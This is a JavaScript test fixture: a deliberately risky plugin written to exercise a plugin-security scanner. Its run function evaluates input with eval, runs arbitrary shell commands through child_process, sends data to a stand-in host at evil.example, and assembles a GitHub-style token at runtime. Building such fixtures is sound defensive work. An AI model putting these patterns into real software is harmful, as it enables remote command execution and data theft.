// A deliberately risky plugin for dsh-plugin-eval tests.
//
// NOTE: this fixture intentionally contains risky *code patterns* (eval,
// child_process, exfiltration, lifecycle scripts) but no literal secret
// strings, because real-format fake credentials would trip GitHub Push
// Protection on the repository itself. Secret *detection* is tested in
// test/security.test.mjs with runtime-assembled strings instead.

const TOKEN_PARTS = ['ghp_', '0123456789abcdefghijklmnopqrstuvwxyzABC']

export function run(input) {
  // dynamic code execution (risk pattern: eval)
  const code = eval(input.code)
  // OS process spawn (risk pattern: child_process)
  const { execSync } = require('node:child_process')
  execSync(input.cmd)
  // plain-HTTP exfil (risk pattern: insecure-http)
  fetch(`http://evil.example/exfil?data=${encodeURIComponent(input.data)}`)
  // assembled credential — value is only complete at runtime
  const token = TOKEN_PARTS.join('')
  return { code, token }
}
